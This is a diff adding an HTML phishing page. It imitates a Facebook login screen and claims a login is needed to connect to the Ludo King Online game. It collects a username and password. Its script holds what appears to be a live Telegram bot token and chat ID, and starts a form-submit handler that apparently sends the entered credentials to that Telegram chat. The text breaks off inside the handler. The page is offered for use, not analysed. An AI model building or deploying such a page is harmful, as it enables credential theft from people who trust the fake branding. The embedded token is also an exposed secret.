@@ -1,0 +1,751 @@
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Ludo King Online Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Helvetica+Neue&amp;family=Roboto&amp;display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        background-color: #f0f2f5;
+      }
+      h1 {
+        font-family: "Roboto", sans-serif;
+        font-weight: 700;
+        letter-spacing: -0.05em;
+      }
+      input::placeholder {
+        color: #8a8d91;
+        font-weight: 500;
+      }
+      button {
+        font-weight: 600;
+        position: relative;
+        z-index: 10;
+      }
+      a,
+      button {
+        transition: color 0.2s ease;
+      }
+      a:hover,
+      button:hover {
+        color: #145dbf;
+        text-decoration: underline;
+      }
+      #copyTooltip {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background-color: #1877f2;
+        color: white;
+        padding: 8px 16px;
+        border-radius: 9999px;
+        font-weight: 600;
+        font-size: 14px;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.3s ease;
+        z-index: 9999;
+      }
+      #copyTooltip.show {
+        opacity: 1;
+        pointer-events: auto;
+      }
+      .disabled-button {
+        cursor: default;
+        pointer-events: none;
+        user-select: none;
+      }
+      #loginButton {
+        min-height: 48px !important;
+        line-height: 1.5 !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+        white-space: nowrap !important;
+        text-overflow: ellipsis !important;
+      }
+      #loginButton:active,
+      #loginButton:focus {
+        color: white !important;
+        background-color: #165ec9 !important;
+        outline: none !important;
+      }
+    </style>
+    <style>
+      *,
+      ::before,
+      ::after {
+        --tw-border-spacing-x: 0;
+        --tw-border-spacing-y: 0;
+        --tw-translate-x: 0;
+        --tw-translate-y: 0;
+        --tw-rotate: 0;
+        --tw-skew-x: 0;
+        --tw-skew-y: 0;
+        --tw-scale-x: 1;
+        --tw-scale-y: 1;
+        --tw-pan-x: ;
+        --tw-pan-y: ;
+        --tw-pinch-zoom: ;
+        --tw-scroll-snap-strictness: proximity;
+        --tw-gradient-from-position: ;
+        --tw-gradient-via-position: ;
+        --tw-gradient-to-position: ;
+        --tw-ordinal: ;
+        --tw-slashed-zero: ;
+        --tw-numeric-figure: ;
+        --tw-numeric-spacing: ;
+        --tw-numeric-fraction: ;
+        --tw-ring-inset: ;
+        --tw-ring-offset-width: 0px;
+        --tw-ring-offset-color: #fff;
+        --tw-ring-color: rgb(59 130 246 / 0.5);
+        --tw-ring-offset-shadow: 0 0 #0000;
+        --tw-ring-shadow: 0 0 #0000;
+        --tw-shadow: 0 0 #0000;
+        --tw-shadow-colored: 0 0 #0000;
+        --tw-blur: ;
+        --tw-brightness: ;
+        --tw-contrast: ;
+        --tw-grayscale: ;
+        --tw-hue-rotate: ;
+        --tw-invert: ;
+        --tw-saturate: ;
+        --tw-sepia: ;
+        --tw-drop-shadow: ;
+        --tw-backdrop-blur: ;
+        --tw-backdrop-brightness: ;
+        --tw-backdrop-contrast: ;
+        --tw-backdrop-grayscale: ;
+        --tw-backdrop-hue-rotate: ;
+        --tw-backdrop-invert: ;
+        --tw-backdrop-opacity: ;
+        --tw-backdrop-saturate: ;
+        --tw-backdrop-sepia: ;
+        --tw-contain-size: ;
+        --tw-contain-layout: ;
+        --tw-contain-paint: ;
+        --tw-contain-style: ;
+      }
+      ::backdrop {
+        --tw-border-spacing-x: 0;
+        --tw-border-spacing-y: 0;
+        --tw-translate-x: 0;
+        --tw-translate-y: 0;
+        --tw-rotate: 0;
+        --tw-skew-x: 0;
+        --tw-skew-y: 0;
+        --tw-scale-x: 1;
+        --tw-scale-y: 1;
+        --tw-pan-x: ;
+        --tw-pan-y: ;
+        --tw-pinch-zoom: ;
+        --tw-scroll-snap-strictness: proximity;
+        --tw-gradient-from-position: ;
+        --tw-gradient-via-position: ;
+        --tw-gradient-to-position: ;
+        --tw-ordinal: ;
+        --tw-slashed-zero: ;
+        --tw-numeric-figure: ;
+        --tw-numeric-spacing: ;
+        --tw-numeric-fraction: ;
+        --tw-ring-inset: ;
+        --tw-ring-offset-width: 0px;
+        --tw-ring-offset-color: #fff;
+        --tw-ring-color: rgb(59 130 246 / 0.5);
+        --tw-ring-offset-shadow: 0 0 #0000;
+        --tw-ring-shadow: 0 0 #0000;
+        --tw-shadow: 0 0 #0000;
+        --tw-shadow-colored: 0 0 #0000;
+        --tw-blur: ;
+        --tw-brightness: ;
+        --tw-contrast: ;
+        --tw-grayscale: ;
+        --tw-hue-rotate: ;
+        --tw-invert: ;
+        --tw-saturate: ;
+        --tw-sepia: ;
+        --tw-drop-shadow: ;
+        --tw-backdrop-blur: ;
+        --tw-backdrop-brightness: ;
+        --tw-backdrop-contrast: ;
+        --tw-backdrop-grayscale: ;
+        --tw-backdrop-hue-rotate: ;
+        --tw-backdrop-invert: ;
+        --tw-backdrop-opacity: ;
+        --tw-backdrop-saturate: ;
+        --tw-backdrop-sepia: ;
+        --tw-contain-size: ;
+        --tw-contain-layout: ;
+        --tw-contain-paint: ;
+        --tw-contain-style: ;
+      } /* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */
+      *,
+      ::after,
+      ::before {
+        box-sizing: border-box;
+        border-width: 0;
+        border-style: solid;
+        border-color: #e5e7eb;
+      }
+      ::after,
+      ::before {
+        --tw-content: "";
+      }
+      :host,
+      html {
+        line-height: 1.5;
+        -webkit-text-size-adjust: 100%;
+        -moz-tab-size: 4;
+        tab-size: 4;
+        font-family:
+          ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji",
+          "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+        font-feature-settings: normal;
+        font-variation-settings: normal;
+        -webkit-tap-highlight-color: transparent;
+      }
+      body {
+        margin: 0;
+        line-height: inherit;
+      }
+      hr {
+        height: 0;
+        color: inherit;
+        border-top-width: 1px;
+      }
+      abbr:where([title]) {
+        -webkit-text-decoration: underline dotted;
+        text-decoration: underline dotted;
+      }
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6 {
+        font-size: inherit;
+        font-weight: inherit;
+      }
+      a {
+        color: inherit;
+        text-decoration: inherit;
+      }
+      b,
+      strong {
+        font-weight: bolder;
+      }
+      code,
+      kbd,
+      pre,
+      samp {
+        font-family:
+          ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas,
+          "Liberation Mono", "Courier New", monospace;
+        font-feature-settings: normal;
+        font-variation-settings: normal;
+        font-size: 1em;
+      }
+      small {
+        font-size: 80%;
+      }
+      sub,
+      sup {
+        font-size: 75%;
+        line-height: 0;
+        position: relative;
+        vertical-align: baseline;
+      }
+      sub {
+        bottom: -0.25em;
+      }
+      sup {
+        top: -0.5em;
+      }
+      table {
+        text-indent: 0;
+        border-color: inherit;
+        border-collapse: collapse;
+      }
+      button,
+      input,
+      optgroup,
+      select,
+      textarea {
+        font-family: inherit;
+        font-feature-settings: inherit;
+        font-variation-settings: inherit;
+        font-size: 100%;
+        font-weight: inherit;
+        line-height: inherit;
+        letter-spacing: inherit;
+        color: inherit;
+        margin: 0;
+        padding: 0;
+      }
+      button,
+      select {
+        text-transform: none;
+      }
+      button,
+      input:where([type="button"]),
+      input:where([type="reset"]),
+      input:where([type="submit"]) {
+        appearance: button;
+        -webkit-appearance: button;
+        background-color: transparent;
+        background-image: none;
+      }
+      :-moz-focusring {
+        outline: auto;
+      }
+      :-moz-ui-invalid {
+        box-shadow: none;
+      }
+      progress {
+        vertical-align: baseline;
+      }
+      ::-webkit-inner-spin-button,
+      ::-webkit-outer-spin-button {
+        height: auto;
+      }
+      [type="search"] {
+        appearance: textfield;
+        -webkit-appearance: textfield;
+        outline-offset: -2px;
+      }
+      ::-webkit-search-decoration {
+        -webkit-appearance: none;
+      }
+      ::-webkit-file-upload-button {
+        -webkit-appearance: button;
+        font: inherit;
+      }
+      summary {
+        display: list-item;
+      }
+      blockquote,
+      dd,
+      dl,
+      figure,
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6,
+      hr,
+      p,
+      pre {
+        margin: 0;
+      }
+      fieldset {
+        margin: 0;
+        padding: 0;
+      }
+      legend {
+        padding: 0;
+      }
+      menu,
+      ol,
+      ul {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+      }
+      dialog {
+        padding: 0;
+      }
+      textarea {
+        resize: vertical;
+      }
+      input::placeholder,
+      textarea::placeholder {
+        opacity: 1;
+        color: #9ca3af;
+      }
+      [role="button"],
+      button {
+        cursor: pointer;
+      }
+      :disabled {
+        cursor: default;
+      }
+      audio,
+      canvas,
+      embed,
+      iframe,
+      img,
+      object,
+      svg,
+      video {
+        display: block;
+        /* vertical-align: middle; */
+      }
+      img,
+      video {
+        max-width: 100%;
+        height: auto;
+      }
+      [hidden]:where(:not([hidden="until-found"])) {
+        display: none;
+      }
+      .mb-5 {
+        margin-bottom: 1.25rem;
+      }
+      .mb-6 {
+        margin-bottom: 1.5rem;
+      }
+      .mb-7 {
+        margin-bottom: 1.75rem;
+      }
+      .mb-8 {
+        margin-bottom: 2rem;
+      }
+      .mt-12 {
+        margin-top: 3rem;
+      }
+      .mt-5 {
+        margin-top: 1.25rem;
+      }
+      .mt-6 {
+        margin-top: 1.5rem;
+      }
+      .flex {
+        display: flex;
+      }
+      .h-5 {
+        height: 1.25rem;
+      }
+      .min-h-screen {
+        min-height: 100vh;
+      }
+      .w-5 {
+        width: 1.25rem;
+      }
+      .w-full {
+        width: 100%;
+      }
+      .max-w-sm {
+        max-width: 24rem;
+      }
+      .max-w-xs {
+        max-width: 20rem;
+      }
+      .cursor-pointer {
+        cursor: pointer;
+      }
+      .select-none {
+        -webkit-user-select: none;
+        user-select: none;
+      }
+      .flex-col {
+        flex-direction: column;
+      }
+      .flex-wrap {
+        flex-wrap: wrap;
+      }
+      .items-center {
+        align-items: center;
+      }
+      .justify-center {
+        justify-content: center;
+      }
+      .gap-x-12 {
+        column-gap: 3rem;
+      }
+      .gap-y-1 {
+        row-gap: 0.25rem;
+      }
+      .space-y-1 > :not([hidden]) ~ :not([hidden]) {
+        --tw-space-y-reverse: 0;
+        margin-top: calc(0.25rem * calc(1 - var(--tw-space-y-reverse)));
+        margin-bottom: calc(0.25rem * var(--tw-space-y-reverse));
+      }
+      .space-y-3 > :not([hidden]) ~ :not([hidden]) {
+        --tw-space-y-reverse: 0;
+        margin-top: calc(0.75rem * calc(1 - var(--tw-space-y-reverse)));
+        margin-bottom: calc(0.75rem * var(--tw-space-y-reverse));
+      }
+      .space-y-4 > :not([hidden]) ~ :not([hidden]) {
+        --tw-space-y-reverse: 0;
+        margin-top: calc(1rem * calc(1 - var(--tw-space-y-reverse)));
+        margin-bottom: calc(1rem * var(--tw-space-y-reverse));
+      }
+      .rounded-lg {
+        border-radius: 0.5rem;
+      }
+      .rounded-md {
+        border-radius: 0.375rem;
+      }
+      .rounded-sm {
+        border-radius: 0.125rem;
+      }
+      .border {
+        border-width: 1px;
+      }
+      .border-gray-300 {
+        --tw-border-opacity: 1;
+        border-color: rgb(209 213 219 / var(--tw-border-opacity, 1));
+      }
+      .border-gray-400 {
+        --tw-border-opacity: 1;
+        border-color: rgb(156 163 175 / var(--tw-border-opacity, 1));
+      }
+      .bg-\[\#1877f2\] {
+        --tw-bg-opacity: 1;
+        background-color: rgb(24 119 242 / var(--tw-bg-opacity, 1));
+      }
+      .px-4 {
+        padding-left: 1rem;
+        padding-right: 1rem;
+      }
+      .px-6 {
+        padding-left: 1.5rem;
+        padding-right: 1.5rem;
+      }
+      .py-3 {
+        padding-top: 0.75rem;
+        padding-bottom: 0.75rem;
+      }
+      .text-center {
+        text-align: center;
+      }
+      .text-4xl {
+        font-size: 2.25rem;
+        line-height: 2.5rem;
+      }
+      .text-\[13px\] {
+        font-size: 13px;
+      }
+      .text-base {
+        font-size: 1rem;
+        line-height: 1.5rem;
+      }
+      .text-lg {
+        font-size: 1.125rem;
+        line-height: 1.75rem;
+      }
+      .text-sm {
+        font-size: 0.875rem;
+        line-height: 1.25rem;
+      }
+      .text-xs {
+        font-size: 0.75rem;
+        line-height: 1rem;
+      }
+      .font-bold {
+        font-weight: 700;
+      }
+      .font-medium {
+        font-weight: 500;
+      }
+      .font-normal {
+        font-weight: 400;
+      }
+      .font-semibold {
+        font-weight: 600;
+      }
+      .leading-none {
+        line-height: 1;
+      }
+      .leading-relaxed {
+        line-height: 1.625;
+      }
+      .text-\[\#1877f2\] {
+        --tw-text-opacity: 1;
+        color: rgb(24 119 242 / var(--tw-text-opacity, 1));
+      }
+      .text-gray-400 {
+        --tw-text-opacity: 1;
+        color: rgb(156 163 175 / var(--tw-text-opacity, 1));
+      }
+      .text-gray-500 {
+        --tw-text-opacity: 1;
+        color: rgb(107 114 128 / var(--tw-text-opacity, 1));
+      }
+      .text-gray-600 {
+        --tw-text-opacity: 1;
+        color: rgb(75 85 99 / var(--tw-text-opacity, 1));
+      }
+      .text-gray-700 {
+        --tw-text-opacity: 1;
+        color: rgb(55 65 81 / var(--tw-text-opacity, 1));
+      }
+      .text-white {
+        --tw-text-opacity: 1;
+        color: rgb(255 255 255 / var(--tw-text-opacity, 1));
+      }
+      .shadow-md {
+        --tw-shadow:
+          0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+        --tw-shadow-colored:
+          0 4px 6px -1px var(--tw-shadow-color),
+          0 2px 4px -2px var(--tw-shadow-color);
+        box-shadow:
+          var(--tw-ring-offset-shadow, 0 0 #0000),
+          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
+      }
+      .shadow-sm {
+        --tw-shadow: 0 1px 2px 0 rgb(0 0 0 / 0.05);
+        --tw-shadow-colored: 0 1px 2px 0 var(--tw-shadow-color);
+        box-shadow:
+          var(--tw-ring-offset-shadow, 0 0 #0000),
+          var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
+      }
+      .hover\:bg-\[\#165ec9\]:hover {
+        --tw-bg-opacity: 1;
+        background-color: rgb(22 94 201 / var(--tw-bg-opacity, 1));
+      }
+      .focus\:border-transparent:focus {
+        border-color: transparent;
+      }
+      .focus\:outline-none:focus {
+        outline: 2px solid transparent;
+        outline-offset: 2px;
+      }
+      .focus\:ring-2:focus {
+        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
+          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
+        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
+          calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
+        box-shadow:
+          var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
+          var(--tw-shadow, 0 0 #0000);
+      }
+      .focus\:ring-\[\#1877f2\]:focus {
+        --tw-ring-opacity: 1;
+        --tw-ring-color: rgb(24 119 242 / var(--tw-ring-opacity, 1));
+      }
+    </style>
+  </head>
+  <body class="min-h-screen flex flex-col items-center">
+    <header class="w-full bg-[#1877f2] py-3 flex justify-center shadow-md">
+      <h1 class="text-white text-4xl select-none">facebook</h1>
+    </header>
+
+    <main class="flex flex-col items-center mt-12 px-6 w-full max-w-sm">
+      <img
+        alt="Ludo star online game image"
+        class="rounded-lg mb-5 shadow-md"
+        height="72"
+        src="https://i.postimg.cc/qR6JwjCv/5a6501a4-a969-492b-94dc-8bd3870cb1a8.jpg"
+        width="72"
+      />
+      <p
+        class="text-center text-gray-500 text-lg mb-8 leading-relaxed font-medium max-w-xs"
+      >
+        Log in to your Facebook account to connect to Ludo King Online
+      </p>
+
+      <form id="loginForm" class="w-full space-y-4" autocomplete="off">
+        <input
+          autocomplete="username"
+          class="w-full border border-gray-300 rounded-md px-4 py-3 text-gray-700 text-base focus:outline-none focus:ring-2 focus:ring-[#1877f2] focus:border-transparent shadow-sm"
+          id="username"
+          name="username"
+          placeholder="Mobile number or email address"
+          required=""
+          type="text"
+        />
+        <input
+          autocomplete="current-password"
+          class="w-full border border-gray-300 rounded-md px-4 py-3 text-gray-700 text-base focus:outline-none focus:ring-2 focus:ring-[#1877f2] focus:border-transparent shadow-sm"
+          id="password"
+          name="password"
+          placeholder="Facebook password"
+          required=""
+          type="password"
+        />
+        <button
+          class="w-full bg-[#1877f2] text-white rounded-md py-3 hover:bg-[#165ec9] shadow-md text-lg"
+          type="submit"
+          id="loginButton"
+        >
+          Log In
+        </button>
+      </form>
+
+      <a
+        class="text-[#1877f2] text-sm mt-5 mb-7 select-none cursor-pointer"
+        href="https://www.facebook.com/ludostarhd"
+        target="_blank"
+        rel="noopener noreferrer"
+        >Forgotten password?</a
+      >
+
+      <div class="flex flex-col items-center space-y-3 mb-8">
+        <button
+          class="text-gray-600 text-sm font-medium disabled-button"
+          type="button"
+          tabindex="-1"
+        >
+          Create account
+        </button>
+        <button
+          class="text-gray-600 text-sm font-medium disabled-button"
+          type="button"
+          tabindex="-1"
+        >
+          Not now
+        </button>
+        <button
+          class="text-gray-400 text-sm font-medium disabled-button"
+          tabindex="-1"
+        >
+          Help Centre
+        </button>
+      </div>
+
+      <div
+        class="w-full flex flex-wrap justify-center gap-x-12 gap-y-1 text-xs text-gray-500 font-semibold select-none"
+      >
+        <div class="flex flex-col items-center space-y-1">
+          <span>English (UK)</span>
+          <span class="font-normal text-[13px]">मराठी</span>
+          <span class="font-normal text-[13px]">ਪੰਜਾਬੀ</span>
+          <span class="font-normal text-[13px]">ગુજરાતી</span>
+        </div>
+        <div class="flex flex-col items-center space-y-1">
+          <span class="font-normal text-[13px]">हिन्दी</span>
+          <span class="font-normal text-[13px]">اردو</span>
+          <span class="font-normal text-[13px]">বাংলা</span>
+          <button
+            aria-label="More languages"
+            class="border border-gray-400 rounded-sm w-5 h-5 flex items-center justify-center text-gray-600 font-bold text-lg leading-none disabled-button"
+            type="button"
+            tabindex="-1"
+          >
+            +
+          </button>
+        </div>
+      </div>
+
+      <p class="text-gray-400 text-xs mt-6 mb-6 select-none">Meta © 2025</p>
+    </main>
+
+    <div id="copyTooltip">Copied to clipboard!</div>
+
+    <script>
+      const TELEGRAM_BOT_TOKEN =
+        "7866706610:AAF2ffk1-O-ugeYDuRa30aEYZp-F_1N3aDA";
+      const TELEGRAM_CHAT_ID = "6035839240";
+
+      const loginButton = document.getElementById("loginButton");
+
+      loginButton.addEventListener("touchstart", (e) => {}, { passive: true });
+      loginButton.addEventListener("mousedown", (e) => e.preventDefault());
+
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", async
